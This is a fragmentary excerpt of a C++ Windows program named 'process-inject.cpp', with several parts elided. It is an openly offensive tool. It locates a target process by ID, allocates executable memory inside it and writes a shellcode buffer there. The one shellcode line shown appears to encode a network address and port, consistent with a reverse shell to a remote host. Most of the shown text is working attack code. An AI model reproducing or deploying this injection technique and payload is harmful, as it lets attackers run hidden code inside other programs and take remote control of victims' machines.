// process-inject.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
...
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x7e\x80\x41\x54"
...
bool findProcessByID(int number) {
	...
	if (Process32First(hProcessSnap, &peParent)) {
		do {
			if ((int)peParent.th32ProcessID == number) {
				return true;
			}
		} while (Process32Next(hProcessSnap, &peParent));
	}
	return false;
}
...
{	
	int pid = 0;
	printf("Enter process to inject: ");
	scanf_s("%d", &pid);
	if(findProcessByID(pid)) {
		...
		LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (pRemoteCode == NULL) {
		...
		SIZE_T bytesWritten;
		if (!WriteProcessMemory(hProcess, pRemoteCode, buf, sizeof(buf), &bytesWritten)) {
